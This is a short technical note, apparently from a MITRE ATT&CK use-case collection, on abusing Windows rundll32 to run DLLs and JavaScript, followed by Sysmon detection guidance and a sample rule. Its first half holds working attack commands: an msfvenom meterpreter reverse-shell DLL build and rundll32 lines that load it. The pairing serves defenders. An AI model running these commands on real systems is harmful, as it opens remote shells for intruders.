## Rundll32

Rundll32 is a legitimate executable in windows that is cable to run 32bit DLLS

Run only 32-bit DLLs

to create DLL from MSF venom

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[Port] -f dll -o evil.dll
```

then run the dll using one of the following commands

```powershell
rundll32 \\webdavserver\evil.dll,entrypoint
```

```powershell
rundll32 C:\evil.dll,EntryPoint
```

```powershell
rundll32 shell32.dll,Control_RunDLL C:\evil.dll
```


Also can run JavaScript that execute PowerShell
```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";new%20ActiveXObject("WScript.Shell").Run("powershell  -c new-item c:\\users\\noname\\desktop\\testrund.txt",0);window.close();

```


### Detection

- sysmon

  - Process Create

    - Rundll32 process creation with cmd as parent process

  - Module Loading

    - Rundll32 load module like ws2_32.dll

  - Network Connection

    - from rundll32 process

      

![Mermaid](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/WSH/Misc/Mermaid.svg)



**Sysmon Rule** 

```xml
<Sysmon schemaversion="4.00">
<HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <EventFiltering>
		<ProcessCreate onmatch="include">
			<Image condition="contains">Rundll32.exe</Image>
		</ProcessCreate>
		
		<NetworkConnection>
			<Image condition="contains">Rundll32.exe</Image>
		</NetworkConnection>
      
		<ImageLoad onmatch="include"> 
			<ImageLoaded condition="contains">ws2_32.dll</ImageLoaded>
		</ImageLoad>
		
		
	</EventFiltering>
</Sysmon>
```

*this rule is just for demonstration, you shouldn't include on process create and Network connection  etc* 

